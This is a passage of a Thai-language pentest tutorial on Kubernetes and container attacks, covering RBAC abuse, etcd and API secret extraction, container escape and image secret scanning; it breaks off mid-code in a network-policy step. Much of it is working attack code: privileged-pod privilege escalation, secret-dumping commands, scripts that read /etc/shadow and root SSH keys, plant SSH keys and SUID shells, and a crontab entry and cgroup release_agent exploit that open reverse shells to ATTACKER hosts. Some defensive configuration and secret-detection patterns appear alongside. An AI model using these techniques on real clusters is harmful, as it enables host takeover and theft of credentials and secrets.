# Part 44: Container Security Advanced (Steps 431-440)

## ภาพรวม
ส่วนนี้ครอบคลุมการทดสอบความปลอดภัยขั้นสูงสำหรับ Container และ Kubernetes ตั้งแต่การโจมตี RBAC misconfiguration ไปจนถึงการ escape จาก container และการตรวจสอบ registry security

---

## Step 431: Kubernetes RBAC Misconfiguration Exploitation

### แนวคิด
Role-Based Access Control (RBAC) ใน Kubernetes กำหนดสิทธิ์การเข้าถึง resource ต่างๆ การตั้งค่าที่ผิดพลาดอาจให้สิทธิ์มากเกินไปและนำไปสู่ privilege escalation

```python
import subprocess
import json
import base64
from typing import Optional

class KubernetesRBACAuditor:
    """
    ตรวจสอบ RBAC misconfiguration ใน Kubernetes cluster
    """
    
    def __init__(self, kubeconfig: Optional[str] = None):
        self.kubeconfig = kubeconfig
        self.kubectl_cmd = ["kubectl"]
        if kubeconfig:
            self.kubectl_cmd.extend(["--kubeconfig", kubeconfig])
    
    def _run_kubectl(self, args: list) -> dict:
        cmd = self.kubectl_cmd + args + ["-o", "json"]
        result = subprocess.run(cmd, capture_output=True, text=True)
        if result.returncode == 0:
            return json.loads(result.stdout)
        return {}
    
    def get_all_roles(self) -> list:
        """ดึง roles ทั้งหมดในทุก namespace"""
        roles = []
        
        # ClusterRoles
        cr_data = self._run_kubectl(["get", "clusterroles"])
        for item in cr_data.get("items", []):
            roles.append({
                "kind": "ClusterRole",
                "name": item["metadata"]["name"],
                "rules": item.get("rules", [])
            })
        
        # Roles in all namespaces
        r_data = self._run_kubectl(["get", "roles", "--all-namespaces"])
        for item in r_data.get("items", []):
            roles.append({
                "kind": "Role",
                "name": item["metadata"]["name"],
                "namespace": item["metadata"]["namespace"],
                "rules": item.get("rules", [])
            })
        
        return roles
    
    def check_dangerous_permissions(self, rules: list) -> list:
        """ตรวจหา permissions อันตราย"""
        dangerous = []
        
        DANGEROUS_PATTERNS = [
            {"verbs": ["*"], "resources": ["*"], "risk": "CRITICAL - Wildcard all resources"},
            {"verbs": ["create", "update", "patch"], "resources": ["clusterrolebindings"], "risk": "HIGH - Can escalate privileges"},
            {"verbs": ["create"], "resources": ["pods"], "risk": "HIGH - Can create privileged pods"},
            {"verbs": ["exec"], "resources": ["pods"], "risk": "HIGH - Can exec into pods"},
            {"verbs": ["get", "list"], "resources": ["secrets"], "risk": "HIGH - Can read secrets"},
            {"verbs": ["create"], "resources": ["daemonsets"], "risk": "HIGH - Can create privileged daemonsets"},
            {"verbs": ["bind"], "resources": ["clusterroles"], "risk": "HIGH - Can bind cluster roles"},
            {"verbs": ["escalate"], "resources": ["clusterroles"], "risk": "HIGH - Can escalate roles"},
            {"verbs": ["impersonate"], "resources": ["users", "serviceaccounts"], "risk": "HIGH - Can impersonate users"},
            {"verbs": ["patch"], "resources": ["nodes"], "risk": "MEDIUM - Can modify nodes"},
        ]
        
        for rule in rules:
            verbs = rule.get("verbs", [])
            resources = rule.get("resources", [])
            
            for pattern in DANGEROUS_PATTERNS:
                # ตรวจ wildcard
                if "*" in verbs or any(v in verbs for v in pattern["verbs"]):
                    if "*" in resources or any(r in resources for r in pattern["resources"]):
                        dangerous.append({
                            "risk": pattern["risk"],
                            "rule": rule
                        })
        
        return dangerous
    
    def find_overprivileged_service_accounts(self) -> list:
        """หา service accounts ที่มีสิทธิ์มากเกินไป"""
        overprivileged = []
        
        # Get all role bindings
        crb_data = self._run_kubectl(["get", "clusterrolebindings"])
        for binding in crb_data.get("items", []):
            subjects = binding.get("subjects", [])
            role_ref = binding.get("roleRef", {})
            
            for subject in subjects:
                if subject.get("kind") == "ServiceAccount":
                    # Get the role's permissions
                    role_name = role_ref.get("name", "")
                    role_data = self._run_kubectl(["get", "clusterrole", role_name])
                    rules = role_data.get("rules", [])
                    
                    dangerous = self.check_dangerous_permissions(rules)
                    if dangerous:
                        overprivileged.append({
                            "service_account": f"{subject.get('namespace', 'cluster-wide')}/{subject.get('name')}",
                            "bound_to": role_name,
                            "dangerous_permissions": dangerous
                        })
        
        return overprivileged
    
    def exploit_wildcard_permission(self, namespace: str = "default") -> str:
        """สาธิตการใช้ประโยชน์จาก wildcard permission"""
        exploit_pod = """apiVersion: v1
kind: Pod
metadata:
  name: privesc-pod
  namespace: {namespace}
spec:
  hostPID: true
  hostNetwork: true
  hostIPC: true
  containers:
  - name: privesc
    image: alpine
    command: ["/bin/sh", "-c", "nsenter -t 1 -m -u -i -n -p -- bash"]
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host-root
  volumes:
  - name: host-root
    hostPath:
      path: /
  serviceAccountName: default""".format(namespace=namespace)
        
        return exploit_pod
    
    def check_anonymous_access(self) -> dict:
        """ตรวจสอบ anonymous access"""
        # Check what anonymous can do
        cmd = self.kubectl_cmd + [
            "auth", "can-i", "--list",
            "--as=system:anonymous",
            "--as-group=system:unauthenticated"
        ]
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        return {
            "anonymous_permissions": result.stdout,
            "error": result.stderr
        }
    
    def audit_service_account_tokens(self) -> list:
        """ตรวจสอบ service account tokens ที่ mount อยู่ใน pods"""
        findings = []
        
        pods_data = self._run_kubectl(["get", "pods", "--all-namespaces"])
        for pod in pods_data.get("items", []):
            spec = pod.get("spec", {})
            
            # Default token mount
            if spec.get("automountServiceAccountToken", True):
                sa = spec.get("serviceAccountName", "default")
                findings.append({
                    "pod": pod["metadata"]["name"],
                    "namespace": pod["metadata"]["namespace"],
                    "service_account": sa,
                    "issue": "Service account token auto-mounted"
                })
        
        return findings
    
    def generate_report(self) -> str:
        """สร้างรายงาน RBAC audit"""
        report = ["=" * 70]
        report.append("KUBERNETES RBAC SECURITY AUDIT REPORT")
        report.append("=" * 70)
        
        # Overprivileged SAs
        overprivileged = self.find_overprivileged_service_accounts()
        report.append(f"\n[!] Overprivileged Service Accounts: {len(overprivileged)}")
        for sa in overprivileged:
            report.append(f"  SA: {sa['service_account']} -> Role: {sa['bound_to']}")
            for perm in sa['dangerous_permissions']:
                report.append(f"    RISK: {perm['risk']}")
        
        # Anonymous access
        anon = self.check_anonymous_access()
        report.append("\n[!] Anonymous Access Check:")
        report.append(anon['anonymous_permissions'][:500])
        
        # Token mounts
        tokens = self.audit_service_account_tokens()
        report.append(f"\n[!] Pods with auto-mounted tokens: {len(tokens)}")
        
        return "\n".join(report)


# Kubernetes RBAC exploitation techniques
RBAC_EXPLOITATION = """
# เทคนิคการโจมตี RBAC Kubernetes

# 1. ตรวจสอบสิทธิ์ปัจจุบัน
kubectl auth can-i --list
kubectl auth can-i create pods
kubectl auth can-i get secrets

# 2. ตรวจสอบ service account token ใน pod
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace

# 3. ใช้ token เรียก API
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export APISERVER=https://kubernetes.default.svc
curl -s $APISERVER/api/v1/namespaces/default/pods \
  --header "Authorization: Bearer $TOKEN" \
  --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# 4. สร้าง pod ที่มีสิทธิ์สูง (ถ้ามีสิทธิ์ create pods)
kubectl run privesc --image=alpine \
  --overrides='{"spec":{"hostPID":true,"hostNetwork":true,\
  "containers":[{"name":"privesc","image":"alpine",\
  "command":["/bin/sh","-c","nsenter -t 1 -m -u -i -n -p -- bash"],\
  "securityContext":{"privileged":true}}]}}'

# 5. ขโมย secrets
kubectl get secrets --all-namespaces -o json | \
  python3 -c "import sys,json; [print(s['metadata']['name'],s.get('data',{})) for s in json.load(sys.stdin)['items']]"

# 6. Create ClusterRoleBinding (ถ้ามีสิทธิ์)
kubectl create clusterrolebinding pwned-binding \
  --clusterrole=cluster-admin \
  --serviceaccount=default:default
"""

if __name__ == "__main__":
    auditor = KubernetesRBACAuditor()
    print(auditor.generate_report())
```

---

## Step 432: Kubernetes etcd Access and Secrets Extraction

### แนวคิด
etcd เป็น key-value store ที่เก็บข้อมูลทั้งหมดของ Kubernetes cluster การเข้าถึง etcd โดยตรงหมายถึงการเข้าถึงข้อมูลทั้งหมดรวมถึง secrets

```python
import subprocess
import json
import base64
from typing import Optional

class EtcdSecretExtractor:
    """
    ดึงข้อมูลจาก etcd ของ Kubernetes
    """
    
    def __init__(
        self,
        etcd_endpoint: str = "https://127.0.0.1:2379",
        cert_file: Optional[str] = None,
        key_file: Optional[str] = None,
        ca_file: Optional[str] = None
    ):
        self.endpoint = etcd_endpoint
        self.cert_file = cert_file
        self.key_file = key_file
        self.ca_file = ca_file
    
    def _etcdctl_cmd(self, args: list) -> str:
        cmd = ["etcdctl", "--endpoints", self.endpoint]
        
        if self.cert_file:
            cmd.extend(["--cert", self.cert_file])
        if self.key_file:
            cmd.extend(["--key", self.key_file])
        if self.ca_file:
            cmd.extend(["--cacert", self.ca_file])
        
        cmd.extend(["--api-version=3"])
        cmd.extend(args)
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.stdout
    
    def list_all_keys(self) -> list:
        """แสดง keys ทั้งหมดใน etcd"""
        output = self._etcdctl_cmd(["get", "/", "--prefix", "--keys-only"])
        return [k for k in output.strip().split("\n") if k]
    
    def get_all_secrets(self) -> list:
        """ดึง secrets ทั้งหมด"""
        secrets = []
        output = self._etcdctl_cmd([
            "get", "/registry/secrets",
            "--prefix"
        ])
        
        # Parse etcd output (key-value pairs)
        lines = output.split("\n")
        for i, line in enumerate(lines):
            if line.startswith("/registry/secrets/"):
                key = line
                value = lines[i+1] if i+1 < len(lines) else ""
                secrets.append({"key": key, "value": value})
        
        return secrets
    
    def get_service_account_tokens(self) -> list:
        """ดึง service account tokens"""
        tokens = []
        output = self._etcdctl_cmd([
            "get", "/registry/secrets",
            "--prefix"
        ])
        
        # หา kubernetes.io/service-account-token type
        # ข้อมูลใน etcd เป็น protobuf format
        if "service-account-token" in output:
            tokens.append("Service account tokens found in etcd")
        
        return tokens
    
    def decode_secret_data(self, raw_data: str) -> dict:
        """Decode base64 secret data"""
        decoded = {}
        try:
            data = json.loads(raw_data)
            for key, value in data.get("data", {}).items():
                try:
                    decoded[key] = base64.b64decode(value).decode()
                except Exception:
                    decoded[key] = value
        except Exception:
            pass
        return decoded
    
    def backup_all_data(self, output_file: str) -> bool:
        """สำรองข้อมูลทั้งหมดจาก etcd (snapshot)"""
        cmd = ["etcdctl", "--endpoints", self.endpoint]
        if self.cert_file:
            cmd.extend(["--cert", self.cert_file,
                       "--key", self.key_file,
                       "--cacert", self.ca_file])
        cmd.extend(["snapshot", "save", output_file])
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        return result.returncode == 0


ETCD_ATTACK_COMMANDS = """
# etcd Attack Commands

# 1. ตรวจสอบ etcd endpoint
curl -k https://TARGET:2379/health
curl -k https://TARGET:2380/members

# 2. ดึงข้อมูลโดยไม่มี auth (etcd ที่ไม่ได้ configure auth)
ETCDCTL_API=3 etcdctl \
  --endpoints=https://TARGET:2379 \
  get / --prefix --keys-only

# 3. ดึง secrets ทั้งหมด
ETCDCTL_API=3 etcdctl \
  --endpoints=https://TARGET:2379 \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  get /registry/secrets --prefix

# 4. ดึง specific secret
ETCDCTL_API=3 etcdctl \
  --endpoints=https://TARGET:2379 \
  get /registry/secrets/default/my-secret

# 5. ดึง kubeconfig admin
ETCDCTL_API=3 etcdctl \
  --endpoints=https://TARGET:2379 \
  get /registry/secrets/kube-system/admin.conf

# 6. Snapshot backup
ETCDCTL_API=3 etcdctl \
  --endpoints=https://TARGET:2379 \
  snapshot save /tmp/etcd-backup.db

# 7. restore แล้วดึงข้อมูล
ETCDCTL_API=3 etcdctl snapshot restore /tmp/etcd-backup.db \
  --data-dir=/tmp/etcd-restored
"""

print(ETCD_ATTACK_COMMANDS)
```

---

## Step 433: Kubernetes API Server Exploitation

### แนวคิด
Kubernetes API Server เป็นจุดศูนย์กลางของ cluster การโจมตี API server อาจเปิดโอกาสให้เข้าควบคุม cluster ทั้งหมด

```python
import requests
import json
import urllib3
from typing import Optional

urllib3.disable_warnings()

class K8sAPIExplorer:
    """
    สำรวจและทดสอบ Kubernetes API Server
    """
    
    def __init__(
        self,
        api_server: str,
        token: Optional[str] = None,
        verify_ssl: bool = False
    ):
        self.api_server = api_server.rstrip("/")
        self.verify_ssl = verify_ssl
        self.headers = {"Content-Type": "application/json"}
        
        if token:
            self.headers["Authorization"] = f"Bearer {token}"
    
    def check_unauthenticated_access(self) -> dict:
        """ตรวจสอบ unauthenticated access"""
        findings = []
        
        # Common endpoints to test
        test_endpoints = [
            "/api",
            "/api/v1",
            "/apis",
            "/version",
            "/healthz",
            "/metrics",
            "/api/v1/namespaces",
            "/api/v1/pods",
            "/api/v1/secrets",
            "/api/v1/nodes",
        ]
        
        for endpoint in test_endpoints:
            try:
                resp = requests.get(
                    f"{self.api_server}{endpoint}",
                    verify=self.verify_ssl,
                    timeout=5
                )
                if resp.status_code == 200:
                    findings.append({
                        "endpoint": endpoint,
                        "status": resp.status_code,
                        "accessible": True,
                        "size": len(resp.content)
                    })
                elif resp.status_code == 403:
                    findings.append({
                        "endpoint": endpoint,
                        "status": resp.status_code,
                        "accessible": False,
                        "note": "403 - authenticated but forbidden"
                    })
            except Exception as e:
                pass
        
        return {"unauthenticated_findings": findings}
    
    def list_secrets(self, namespace: str = "default") -> list:
        """ดึง secrets ผ่าน API"""
        try:
            resp = requests.get(
                f"{self.api_server}/api/v1/namespaces/{namespace}/secrets",
                headers=self.headers,
                verify=self.verify_ssl
            )
            if resp.status_code == 200:
                data = resp.json()
                return [
                    {
                        "name": item["metadata"]["name"],
                        "type": item["type"],
                        "data_keys": list(item.get("data", {}).keys())
                    }
                    for item in data.get("items", [])
                ]
        except Exception:
            pass
        return []
    
    def create_privileged_pod(self, namespace: str = "default") -> dict:
        """สร้าง privileged pod ผ่าน API"""
        pod_spec = {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {
                "name": "pentest-privesc",
                "namespace": namespace
            },
            "spec": {
                "hostPID": True,
                "hostNetwork": True,
                "hostIPC": True,
                "containers": [{
                    "name": "privesc",
                    "image": "alpine:latest",
                    "command": ["/bin/sh", "-c", "id; whoami; cat /host/etc/shadow"],
                    "securityContext": {
                        "privileged": True,
                        "runAsUser": 0
                    },
                    "volumeMounts": [{
                        "name": "host-root",
                        "mountPath": "/host"
                    }]
                }],
                "volumes": [{
                    "name": "host-root",
                    "hostPath": {"path": "/"}
                }]
            }
        }
        
        try:
            resp = requests.post(
                f"{self.api_server}/api/v1/namespaces/{namespace}/pods",
                headers=self.headers,
                json=pod_spec,
                verify=self.verify_ssl
            )
            return {"status": resp.status_code, "response": resp.json()}
        except Exception as e:
            return {"error": str(e)}
    
    def check_anonymous_kubelet(self, node_ip: str, port: int = 10250) -> dict:
        """ตรวจสอบ Kubelet ที่ไม่มี auth"""
        findings = []
        
        endpoints = [
            f"https://{node_ip}:{port}/pods",
            f"https://{node_ip}:{port}/metrics",
            f"https://{node_ip}:{port}/stats",
            f"https://{node_ip}:{port}/logs/",
        ]
        
        for endpoint in endpoints:
            try:
                resp = requests.get(endpoint, verify=False, timeout=5)
                if resp.status_code == 200:
                    findings.append({
                        "endpoint": endpoint,
                        "accessible": True,
                        "data_size": len(resp.content)
                    })
            except Exception:
                pass
        
        return {"kubelet_findings": findings}
    
    def exec_in_pod(self, pod: str, namespace: str, command: list) -> str:
        """exec command ใน pod ผ่าน API (websocket)"""
        # ต้องใช้ websocket สำหรับ exec
        endpoint = (
            f"{self.api_server}/api/v1/namespaces/{namespace}"
            f"/pods/{pod}/exec?command={'&command='.join(command)}"
            f"&stdin=false&stdout=true&stderr=true&tty=false"
        )
        return f"WebSocket exec endpoint: {endpoint}"


# Kubernetes API attack cheatsheet
K8S_API_ATTACKS = """
# Kubernetes API Server Attack Cheatsheet

# 1. ค้นหา API server
nmap -sV -p 6443,8080 TARGET_RANGE

# 2. ตรวจสอบ unauthenticated access
curl -sk https://TARGET:6443/api/v1/namespaces
curl -sk https://TARGET:8080/api/v1/secrets  # insecure port

# 3. ใช้ token ที่ได้มา
export TOKEN="eyJhbGc..."
kubectl --server=https://TARGET:6443 \
  --token=$TOKEN \
  --insecure-skip-tls-verify=true \
  get pods --all-namespaces

# 4. โจมตีผ่าน Kubelet
# List pods
curl -sk https://NODE_IP:10250/pods

# Exec command ใน container
curl -sk https://NODE_IP:10250/run/NAMESPACE/POD/CONTAINER \
  -d cmd=id

# 5. โจมตีผ่าน Dashboard (ถ้าเปิดไว้)
curl http://TARGET:8001/api/v1/namespaces/kubernetes-dashboard/secrets

# 6. Privilege escalation ผ่าน create pod
kubectl run root-shell --image=alpine \
  --overrides='{ "spec": { "hostPID": true, \
  "containers": [{ "name": "root-shell", \
  "image": "alpine", \
  "command": ["nsenter", "--target", "1", "--mount", \
  "--uts", "--ipc", "--net", "--pid", "--", "bash"], \
  "securityContext": { "privileged": true } }] } }'
"""

print(K8S_API_ATTACKS)
```

---

## Step 434: Container Escape via Privileged Containers

### แนวคิด
Privileged containers มีสิทธิ์เทียบเท่า root บน host ทำให้สามารถ escape ออกจาก container ได้

```python
import os
import subprocess
from typing import Optional

class ContainerEscaper:
    """
    เทคนิคการ escape จาก container
    """
    
    def detect_container_environment(self) -> dict:
        """ตรวจสอบว่าอยู่ใน container หรือไม่"""
        indicators = {}
        
        # ตรวจสอบ .dockerenv
        indicators["dockerenv"] = os.path.exists("/.dockerenv")
        
        # ตรวจสอบ cgroups
        try:
            with open("/proc/1/cgroup") as f:
                content = f.read()
                indicators["in_docker"] = "docker" in content
                indicators["in_kubernetes"] = "kubepods" in content
        except Exception:
            pass
        
        # ตรวจสอบ capabilities
        try:
            with open("/proc/self/status") as f:
                for line in f:
                    if "CapEff:" in line:
                        cap_hex = int(line.split()[1], 16)
                        # CAP_SYS_ADMIN = bit 21
                        indicators["has_sys_admin"] = bool(cap_hex & (1 << 21))
                        # CAP_NET_ADMIN = bit 12  
                        indicators["has_net_admin"] = bool(cap_hex & (1 << 12))
                        # All capabilities (privileged)
                        indicators["is_privileged"] = cap_hex == 0xffffffffffffffff
        except Exception:
            pass
        
        # ตรวจสอบ mounted host filesystem
        indicators["host_root_mounted"] = any(
            os.path.ismount(f"/host{p}") for p in ["/", "/proc", "/sys"]
        )
        
        return indicators
    
    def escape_via_nsenter(self) -> str:
        """Escape ผ่าน nsenter ใน privileged container"""
        commands = [
            # เข้าถึง host namespace ผ่าน nsenter
            "nsenter -t 1 -m -u -i -n -p -- id",
            "nsenter -t 1 -m -u -i -n -p -- cat /etc/shadow",
            "nsenter -t 1 -m -u -i -n -p -- bash -c 'id && hostname && cat /etc/hosts'",
        ]
        
        for cmd in commands:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                return f"Escape successful!\n{result.stdout}"
        
        return "nsenter escape failed"
    
    def escape_via_host_mount(self, host_path: str = "/host") -> str:
        """Escape ผ่าน host filesystem mount"""
        techniques = [
            # อ่านไฟล์ sensitive
            f"cat {host_path}/etc/shadow",
            f"cat {host_path}/root/.ssh/id_rsa",
            
            # เขียน SSH key
            f"mkdir -p {host_path}/root/.ssh && "
            f"echo 'ssh-rsa AAAA...' >> {host_path}/root/.ssh/authorized_keys",
            
            # เขียน crontab สำหรับ reverse shell
            f"echo '* * * * * root bash -i >& /dev/tcp/ATTACKER/4444 0>&1' "
            f">> {host_path}/etc/crontab",
            
            # สร้าง SUID shell
            f"cp {host_path}/bin/bash {host_path}/tmp/bash && "
            f"chmod u+s {host_path}/tmp/bash",
        ]
        
        results = []
        for cmd in techniques:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            results.append({
                "cmd": cmd[:50] + "...",
                "success": result.returncode == 0,
                "output": result.stdout[:200]
            })
        
        return results
    
    def escape_via_docker_socket(self, socket_path: str = "/var/run/docker.sock") -> str:
        """Escape ผ่าน docker.sock ที่ mount อยู่ใน container"""
        if not os.path.exists(socket_path):
            return f"Docker socket not found at {socket_path}"
        
        # ใช้ docker socket สร้าง container ใหม่ที่ mount host
        escape_cmd = f"""
docker -H unix://{socket_path} run -it --rm \
  --privileged \
  --pid=host \
  --net=host \
  -v /:/host \
  alpine \
  nsenter -t 1 -m -u -i -n -p -- /bin/bash
"""
        return escape_cmd
    
    def escape_via_cgroup_v1_release(self) -> str:
        """Escape ผ่าน cgroup v1 release_agent (CVE-2022-0492)"""
        exploit = """
#!/bin/bash
# Container Escape via cgroup v1 release_agent

# สร้าง directory สำหรับ cgroup
mkdir -p /tmp/cgroup-escape
mount -t cgroup -o rdma cgroup /tmp/cgroup-escape
mkdir /tmp/cgroup-escape/x

# ตั้งค่า notify_on_release
echo 1 > /tmp/cgroup-escape/x/notify_on_release

# หา host path ของ overlay
host_path=$(sed -n 's/.*\soverlay\s.*\supper=\([^,]*\).*/\1/p' /proc/mounts)

# สร้าง release_agent script
echo "#!/bin/bash" > /escape
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" >> /escape
chmod +x /escape

# ตั้งค่า release_agent
echo "${host_path}/escape" > /tmp/cgroup-escape/release_agent

# Trigger
sh -c "echo $$ > /tmp/cgroup-escape/x/cgroup.procs"

echo "[*] Exploit triggered, check listener"
"""
        return exploit
    
    def check_seccomp_status(self) -> dict:
        """ตรวจสอบ seccomp profile"""
        status = {}
        
        try:
            with open("/proc/self/status") as f:
                for line in f:
                    if "Seccomp:" in line:
                        val = int(line.split()[1])
                        status["seccomp_mode"] = {
                            0: "SECCOMP_MODE_DISABLED",
                            1: "SECCOMP_MODE_STRICT",
                            2: "SECCOMP_MODE_FILTER"
                        }.get(val, f"Unknown ({val})")
                        status["seccomp_enabled"] = val > 0
        except Exception as e:
            status["error"] = str(e)
        
        return status


# Container escape detection countermeasures
DEFENSE_CONFIGS = """
# Kubernetes Security Context ที่ปลอดภัย
apiVersion: v1
kind: Pod
spec:
  securityContext:
    runAsNonRoot: true
    runAsUser: 1000
    fsGroup: 2000
    seccompProfile:
      type: RuntimeDefault
    sysctls: []
  containers:
  - name: app
    image: myapp:latest
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      privileged: false
      capabilities:
        drop:
        - ALL
        add:
        - NET_BIND_SERVICE  # เฉพาะที่จำเป็น
    resources:
      limits:
        cpu: "100m"
        memory: "128Mi"
"""

print(DEFENSE_CONFIGS)
```

---

## Step 435: Container Image Security Analysis

### แนวคิด
Container images อาจมีช่องโหว่ด้านความปลอดภัย เช่น secrets ที่ฝังอยู่ในชั้น layers, outdated packages, หรือ malicious content

```python
import subprocess
import json
import re
import hashlib
from pathlib import Path
from typing import Optional

class ContainerImageAnalyzer:
    """
    วิเคราะห์ความปลอดภัยของ container images
    """
    
    SENSITIVE_PATTERNS = [
        (r'(?i)(password|passwd|pass)\s*[=:]\s*\S+', 'Password in file'),
        (r'(?i)(api_key|apikey|api-key)\s*[=:]\s*\S+', 'API Key'),
        (r'(?i)(secret|secret_key)\s*[=:]\s*\S+', 'Secret'),
        (r'(?i)(token)\s*[=:]\s*\S+', 'Token'),
        (r'AKIA[0-9A-Z]{16}', 'AWS Access Key'),
        (r'(?i)aws_secret_access_key\s*[=:]\s*\S+', 'AWS Secret Key'),
        (r'-----BEGIN (RSA|EC|DSA|OPENSSH) PRIVATE KEY-----', 'Private Key'),
        (r'(?i)(private_key|privatekey)\s*[=:]\s*\S+', 'Private Key Reference'),
        (r'ghp_[0-9a-zA-Z]{36}', 'GitHub Personal Token'),
        (r'(?i)db_password\s*[=:]\s*\S+', 'Database Password'),
    ]
    
    def scan_image_layers(self, image: str) -> dict:
        """สแกน layers ของ image"""
        findings = []
        
        # Get image history
        result = subprocess.run(
            ["docker", "history", "--no-trunc", "--format", "{{json .}}", image],
            capture_output=True, text=True
        )
        
        if result.returncode != 0:
            return {"error": result.stderr}
        
        for line in result.stdout.strip().split("\n"):
            if not line:
                continue
            try:
                layer = json.loads(line)
                cmd = layer.get("CreatedBy", "")
                
                # ตรวจหา secrets ใน layer commands
                for pattern, secret_type in self.SENSITIVE_PATTERNS:
                    matches = re.findall(pattern, cmd)
                    if matches:
                        findings.append({
                            "layer": layer.get("ID", "unknown")[:12],
                            "secret_type": secret_type,
                            "command": cmd[:200],
                            "matches": matches[:3]
                        })
                
                # ตรวจหา ENV ที่อันตราย
                if "ENV" in cmd and any(
                    keyword in cmd.upper() 
                    for keyword in ["PASSWORD", "SECRET", "KEY", "TOKEN"]
                ):
                    findings.append({
                        "layer": layer.get("ID", "unknown")[:12],
                        "secret_type": "ENV Variable with sensitive data",
                        "command": cmd[:200]
                    })
            except json.JSONDecodeError:
                pass
        
        return {"image": image, "layer_findings": findings}
    
    def extract_filesystem_secrets(self, image: str) -> list:
        """ดึงไฟล์ sensitive จาก image filesystem"""
        secrets = []
        
        # Create temp container
        result = subprocess.run(
            ["docker", "create", image],
            capture_output=True, text=True
        )
        
        if result.returncode != 0:
            return []
        
        container_id = result.stdout.strip()
        
        try:
            # Sensitive paths to check
            sensitive_paths = [
                "/etc/passwd", "/etc/shadow", "/root/.ssh/",
                "/home", "/.env", "/app/.env",
                "/var/www/.env", "/config", "/secrets",
                "/run/secrets", "/.aws/credentials",
            ]
            
            for path in sensitive_paths:
                result = subprocess.run(
                    ["docker", "cp", f"{container_id}:{path}", "/tmp/extracted/"],
                    capture_output=True, text=True
                )
                if result.returncode == 0:
                    secrets.append({
                        "path": path,
                        "extracted": True,
                        "note": "File exists and extracted"
                    })
        finally:
            subprocess.run(["docker", "rm", container_id], capture_output=True)
        
        return secrets
    
    def run_trivy_scan(self, image: str) -> dict:
        """สแกนช่องโหว่ด้วย Trivy"""
        result = subprocess.run(
            ["trivy", "image", "--format", "json", "--severity",
             "HIGH,CRITICAL", image],
            capture_output=True, text=True
        )
        
        if result.returncode == 0:
            try:
                data = json.loads(result.stdout)
                vulns = []
                for res in data.get("Results", []):
                    for vuln in res.get("Vulnerabilities", []):
                        vulns.append({
                            "pkg": vuln.get("PkgName"),
                            "version": vuln.get("InstalledVersion"),
                            "cve": vuln.get("VulnerabilityID"),
                            "severity": vuln.get("Severity"),
                            "fixed_in": vuln.get("FixedVersion")
                        })
                return {"image": image, "vulnerabilities": vulns}
            except Exception:
                pass
        
        return {"error": "trivy scan failed"}
    
    def check_dockerfile_best_practices(self, dockerfile_path: str) -> list:
        """ตรวจสอบ Dockerfile best practices"""
        issues = []
        
        try:
            with open(dockerfile_path) as f:
                content = f.read()
                lines = content.split("\n")
            
            for i, line in enumerate(lines, 1):
                # Running as root
                if line.strip().startswith("USER") and "root" in line.lower():
                    issues.append(f"Line {i}: Running as root user")
                
                # ADD instead of COPY
                if line.strip().startswith("ADD") and "http" not in line:
                    issues.append(f"Line {i}: Use COPY instead of ADD for local files")
                
                # Sensitive data in ENV
                for pattern, secret_type in self.SENSITIVE_PATTERNS:
                    if re.search(pattern, line, re.IGNORECASE):
                        issues.append(f"Line {i}: Potential {secret_type} in Dockerfile")
                
                # curl | bash
                if "curl" in line and "bash" in line and "|" in line:
                    issues.append(f"Line {i}: Dangerous curl | bash pattern")
                
                # Latest tag
                if "FROM" in line and ":latest" in line:
                    issues.append(f"Line {i}: Using latest tag (unpinned)")
                
                # No version pinning in apt-get
                if "apt-get install" in line and "=" not in line:
                    issues.append(f"Line {i}: apt-get install without version pinning")
        
        except Exception as e:
            issues.append(f"Error reading Dockerfile: {e}")
        
        return issues


# Image scanning commands
IMAGE_SCAN_COMMANDS = """
# Container Image Security Scanning

# 1. Trivy - vulnerability scanner
trivy image nginx:latest
trivy image --severity HIGH,CRITICAL alpine:3.14
trivy fs /path/to/project  # scan filesystem
trivy config /path/to/k8s-manifests  # scan IaC

# 2. Grype - vulnerability scanner
grype ubuntu:22.04
grype dir:.

# 3. Syft - SBOM generator
syft alpine:latest
syft dir:. -o json

# 4. dive - explore image layers
dive nginx:latest

# 5. สแกนหา secrets ใน image
docker save IMAGE:TAG | tar -x -O --wildcards '*/layer.tar' | tar -x --to-stdout | strings | grep -E '(password|secret|key|token)'

# 6. Snyk container scan
snyk container test nginx:latest
snyk container monitor nginx:latest

# 7. Anchore engine
anchore-cli image add docker.io/library/nginx:latest
anchore-cli image vuln docker.io/library/nginx:latest all

# 8. Extract secrets จาก running container
docker inspect CONTAINER_ID | python3 -c "
import sys, json
for c in json.load(sys.stdin):
    env = c.get('Config', {}).get('Env', [])
    for e in env:
        if any(k in e.upper() for k in ['SECRET','KEY','PASS','TOKEN']):
            print('[SENSITIVE]', e)
"
"""

print(IMAGE_SCAN_COMMANDS)
```

---

## Step 436: Kubernetes Network Policy Bypass

### แนวคิด
Network Policies ใน Kubernetes ควบคุมการสื่อสารระหว่าง pods ถ้า policy ตั้งค่าไม่ถูกต้อง อาจทำให้ bypass ได้

```python
import subprocess
import json
import socket
import threading
from typing import Optional

class K8sNetworkPolicyAuditor:
    """
    ตรวจสอบและ bypass Kubernetes Network Policies
    """
    
    def __init__(self, kubeconfig: Optional[str] = None):
        self.kubectl = ["kubectl"]
        if kubeconfig:
            self.kubectl.extend(["--kubeconfig", kubeconfig])
    
    def get_all_network_policies(self) -> list:
        """ดึง Network Policies ทั้งหมด"""
        cmd = self.kubectl + ["get", "networkpolicies",
                              "--all-namespaces", "-o", "json"]
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode != 0:
            return []
        
        data = json.loads(result.stdout)
        policies = []
        
        for item in data.get("items", []):
            policies.append({
                "name": item["metadata"]["name"],
                "namespace": item["metadata"]["namespace"],
